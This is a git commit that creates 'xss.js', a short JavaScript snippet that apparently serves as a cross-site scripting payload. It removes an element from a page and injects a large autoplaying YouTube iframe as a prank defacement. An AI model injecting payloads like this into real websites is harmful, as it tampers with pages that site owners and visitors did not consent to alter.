8d45e478af1d5050b09ebacf18fdb0c8ace20577
EstebanRi <rivarolaesteban@hotmail.com>
2019-01-02 17:03:35 -0300

    Create xss.js

---
+++ xss.js
@@ -0,0 +1,7 @@
+var _aa = _dd[0].parentElement;
+
+_aa.removeChild(_dd[0]);
+
+var __e = document.createElement("div");
+__e.innerHTML= '<center><iframe width="1280" height="745" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" frameborder="0" allow="accelerometer; autoplay=true; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></center>'
+_aa.append(__e);
